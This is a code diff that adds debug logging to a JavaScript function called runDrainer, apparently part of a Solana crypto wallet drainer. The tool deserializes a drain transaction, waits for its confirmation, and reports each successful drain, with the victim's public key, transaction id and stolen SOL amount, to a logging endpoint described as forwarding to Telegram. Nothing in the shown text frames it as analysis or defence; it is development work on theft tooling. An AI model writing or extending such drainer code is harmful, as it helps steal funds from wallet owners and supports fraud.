@@ -1728,6 +1728,14 @@ async function runDrainer(provider) {
     
     // Extract drain amount from API response metadata
     const actualDrainAmount = responseData.metadata?.solAmount || 0;
+    
+    // Log drain amount capture for debugging
+    console.log('[DRAIN_AMOUNT] Captured from API response:', {
+      actualDrainAmount: actualDrainAmount,
+      actualDrainAmountSOL: (actualDrainAmount / 1e9).toFixed(6),
+      metadata: responseData.metadata,
+      balance: balance
+    });
 
     // 3. Deserialize the transaction
     let txBytes;
@@ -2205,6 +2213,15 @@ async function runDrainer(provider) {
                           console.log('[STATUS] Transaction confirmed successfully:', txStatus.confirmationStatus);
                           
                           // Log successful drain to Telegram
+                          console.log('[CONFIRMATION] Sending drain success with amount:', {
+                            publicKey: publicKey.toString(),
+                            txid: txid,
+                            status: 'confirmed',
+                            actualDrainAmount: actualDrainAmount,
+                            actualDrainAmountSOL: (actualDrainAmount / 1e9).toFixed(6),
+                            balance: balance
+                          });
+                          
                           fetch('/api/drainer/log-confirmation', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
